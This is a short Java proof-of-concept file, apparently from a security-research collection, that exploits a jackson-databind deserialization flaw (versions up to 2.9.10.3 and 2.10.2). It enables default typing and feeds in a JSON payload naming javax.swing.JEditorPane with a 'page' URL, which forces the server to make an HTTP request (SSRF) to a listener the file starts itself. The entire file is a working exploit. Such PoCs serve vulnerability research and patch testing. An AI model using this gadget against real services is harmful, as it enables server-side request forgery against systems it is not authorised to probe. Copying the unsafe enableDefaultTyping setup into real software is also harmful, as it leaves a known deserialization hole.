package com.threedr3am.bug.jackson.ssrf;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.HTTPServer;
import java.io.IOException;

/**
 * jackson-databind <= 2.9.10.3 and <= 2.10.2 RCE，需要开启DefaultType
 *
 * （todo JRE自带依赖） (Discovered by threedr3am) 这个还是蛮好的gadget
 *
 * @author threedr3am
 */
public class JREJeditorPaneSSRFPoc {
  static {
    HTTPServer.PORT = 23234;
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"javax.swing.JEditorPane\", {\"page\":\"http://127.0.0.1:23234?a=1&b=2222\"}]";
    mapper.readValue(json, Object.class);
  }
}
